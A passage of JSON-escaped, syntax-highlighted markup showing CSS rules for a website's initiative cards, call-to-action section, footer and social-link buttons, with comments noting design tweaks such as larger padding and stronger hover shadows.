class=\"o\"\u003e(\u003c/span\u003e3, 1fr\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            gap: 2.5rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .initiative-card \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            background-color: var\u003cspan class=\"o\"\u003e(\u003c/span\u003e--light\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            border-radius: 12px\u003cspan class=\"p\"\u003e;\u003c/span\u003e /* More rounded */\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            overflow: hidden\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            box-shadow: \u003cspan class=\"m\"\u003e0\u003c/span\u003e 8px 20px rgba\u003cspan class=\"o\"\u003e(\u003c/span\u003e0, 0, 0, 0.08\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e /* Enhanced shadow */\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            transition: transform 0.3s ease, box-shadow 0.3s ease\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .initiative-card:hover \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            transform: translateY\u003cspan class=\"o\"\u003e(\u003c/span\u003e-12px\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e /* More pronounced lift */\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            box-shadow: \u003cspan class=\"m\"\u003e0\u003c/span\u003e 15px 30px rgba\u003cspan class=\"o\"\u003e(\u003c/span\u003e0, 0, 0, 0.15\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e /* Stronger hover shadow */\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .initiative-img \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            height: 220px\u003cspan class=\"p\"\u003e;\u003c/span\u003e /* Slightly taller images */\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            overflow: hidden\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .initiative-img img \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            width: 100%\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            height: 100%\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            object-fit: cover\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            transition: transform 0.5s ease\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .initiative-card:hover .initiative-img img \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            transform: scale\u003cspan class=\"o\"\u003e(\u003c/span\u003e1.15\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e /* More pronounced zoom */\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .initiative-content \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            padding: 2rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .initiative-content h3 \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            font-size: 1.6rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            margin-bottom: 1rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            color: var\u003cspan class=\"o\"\u003e(\u003c/span\u003e--dark\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .initiative-content p \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            margin-bottom: 1.8rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            font-size: 1.05rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .cta \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            background: linear-gradient\u003cspan class=\"o\"\u003e(\u003c/span\u003eto right, var\u003cspan class=\"o\"\u003e(\u003c/span\u003e--primary\u003cspan class=\"o\"\u003e)\u003c/span\u003e, var\u003cspan class=\"o\"\u003e(\u003c/span\u003e--secondary\u003cspan class=\"o\"\u003e))\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            color: var\u003cspan class=\"o\"\u003e(\u003c/span\u003e--white\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            text-align: center\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            padding: 6rem 0\u003cspan class=\"p\"\u003e;\u003c/span\u003e /* More padding */\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .cta h2 \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            font-size: 3rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e /* Larger heading */\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            margin-bottom: 1.8rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .cta p \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            font-size: 1.3rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            margin-bottom: 2.5rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            max-width: 700px\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            margin-left: auto\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            margin-right: auto\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .cta .btn \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            background-color: var\u003cspan class=\"o\"\u003e(\u003c/span\u003e--white\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            color: var\u003cspan class=\"o\"\u003e(\u003c/span\u003e--primary\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .cta .btn:hover \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            background-color: var\u003cspan class=\"o\"\u003e(\u003c/span\u003e--accent\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            color: var\u003cspan class=\"o\"\u003e(\u003c/span\u003e--white\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        footer \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            background-color: var\u003cspan class=\"o\"\u003e(\u003c/span\u003e--dark\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            color: var\u003cspan class=\"o\"\u003e(\u003c/span\u003e--white\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            padding: 4rem \u003cspan class=\"m\"\u003e0\u003c/span\u003e 2rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e /* More padding */\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .footer-content \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            display: grid\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            grid-template-columns: repeat\u003cspan class=\"o\"\u003e(\u003c/span\u003e4, 1fr\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            gap: 2.5rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e /* More gap */\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            margin-bottom: 2.5rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .footer-column h3 \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            font-size: 1.4rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            margin-bottom: 1.8rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            position: relative\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            padding-bottom: 12px\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .footer-column h3::after \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            content: \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            position: absolute\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            bottom: 0\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            left: 0\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            width: 50px\u003cspan class=\"p\"\u003e;\u003c/span\u003e /* Wider underline */\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            height: 3px\u003cspan class=\"p\"\u003e;\u003c/span\u003e /* Thicker underline */\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            background-color: var\u003cspan class=\"o\"\u003e(\u003c/span\u003e--accent\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .footer-column p \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            margin-bottom: 1.2rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .footer-links \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            list-style: none\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .footer-links li \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            margin-bottom: 1rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .footer-links li a \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            color: var\u003cspan class=\"o\"\u003e(\u003c/span\u003e--light\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            text-decoration: none\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            transition: all 0.3s ease\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .footer-links li a:hover \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            color: var\u003cspan class=\"o\"\u003e(\u003c/span\u003e--accent\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            padding-left: 8px\u003cspan class=\"p\"\u003e;\u003c/span\u003e /* More pronounced slide effect */\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .social-links \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            display: flex\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            gap: 1.2rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            margin-top: 1.5rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .social-links a \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            display: inline-flex\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            align-items: center\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            justify-content: center\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            width: 50px\u003cspan class=\"p\"\u003e;\u003c/span\u003e /* Larger social buttons */\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            height: 50px\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            background-color: rgba\u003cspan class=\"o\"\u003e(\u003c/span\u003e255, 255, 255, 0.15\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e /* Slightly more visible background */\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            border-radius: 8px\u003cspan class=\"p\"\u003e;\u003c/span\u003e /* Square with rounded corners */\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            color: var\u003cspan class=\"o\"\u003e(\u003c/span\u003e--white\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            text-decoration: none\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            font-weight: 600\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            transition: all 0.3s ease\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            font-size: 0.9rem\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .social-links a:hover \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            background-color: var\u003cspan class=\"o\"\u003e(\u003c/span\u003e--accent\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            transform: translateY\u003cspan 